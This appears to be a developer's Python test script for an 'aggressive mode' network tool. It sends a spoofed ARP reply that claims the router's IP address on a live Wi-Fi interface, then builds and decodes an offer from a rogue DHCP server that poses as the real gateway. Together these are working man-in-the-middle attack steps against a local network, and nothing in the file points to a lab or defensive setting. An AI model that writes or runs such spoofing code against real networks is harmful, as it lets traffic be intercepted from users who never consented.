import sys, time
sys.path.insert(0, r"C:\Users\wonma\Documents\electromesh\backend")

print("--- [1] Scapy L2 send attempt (needs Npcap) ---")
try:
    from scapy.all import ARP, Ether, sendp
    pkt = (Ether(src="04:d3:b0:14:79:0e", dst="ff:ff:ff:ff:ff:ff")
           / ARP(op=2, hwsrc="04:d3:b0:14:79:0e", psrc="192.168.0.1",
                 hwdst="ff:ff:ff:ff:ff:ff", pdst="192.168.0.1"))
    print(f"  packet bytes ({len(bytes(pkt))}): {bytes(pkt).hex()}")
    sendp(pkt, verbose=False, iface="Wi-Fi 2")
    print("  [+] sendp() returned without raising — but without Npcap, frame did not hit wire")
except Exception as e:
    print(f"  [!] sendp failed: {type(e).__name__}: {e}")

print()
print("--- [2] DHCP packet builder (no Npcap needed; pure UDP bytes) ---")
from app.services.aggressive_mode import RogueDhcpServer
srv = RogueDhcpServer(our_ip="192.168.0.22", real_gateway_ip="192.168.0.1")
fake_xid = b"\xde\xad\xbe\xef"
fake_chaddr = bytes.fromhex("aabbccddeeff")
reply = srv._build_reply(fake_xid, fake_chaddr, "192.168.0.230", ack=False)
print(f"  built {len(reply)}-byte DHCPOFFER")
print(f"  op={reply[0]}  xid={reply[4:8].hex()}  yiaddr={'.'.join(str(b) for b in reply[16:20])}")
print(f"  siaddr={'.'.join(str(b) for b in reply[20:24])}  magic={reply[236:240].hex()}")
# Parse options
i = 240
opts = []
while i < len(reply):
    c = reply[i]
    if c == 0xff: opts.append("END"); break
    if c == 0:   i += 1; continue
    l = reply[i+1]; v = reply[i+2:i+2+l]
    opts.append(f"opt{c}(len={l})={v.hex()}")
    i += 2 + l
print("  options:", "  ".join(opts))

print()
print("--- [3] DHCPOFFER decode by 3rd-party parser (sanity) ---")
try:
    from scapy.all import BOOTP, DHCP
    parsed = BOOTP(reply)
    print(f"  scapy parsed op={parsed.op} yiaddr={parsed.yiaddr}")
    if parsed.haslayer(DHCP):
        for opt in parsed[DHCP].options:
            if opt == "end": break
            print(f"    {opt}")
except Exception as e:
    print(f"  [!] decode failed: {e}")
